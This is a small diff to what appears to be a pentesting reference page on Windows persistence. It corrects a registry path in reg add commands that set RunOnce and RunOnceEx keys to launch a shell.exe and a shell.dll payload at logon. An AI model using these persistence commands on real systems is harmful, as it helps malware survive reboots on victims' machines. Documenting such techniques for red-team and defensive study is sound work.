@@ -52,7 +52,7 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PeMalware /t
 #Add key for current user - Execute command / PE
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v PeMalware /t REG_SZ /d "C:\tmp\shell.exe"
 #Add key for computer (all users) - Execute DLL
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001Depend" /v DLLMalware /t REG_SZ /d "C:\tmp\shell.dll"
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v DLLMalware /t REG_SZ /d "C:\tmp\shell.dll"
 ```
 {% endtab %}
 
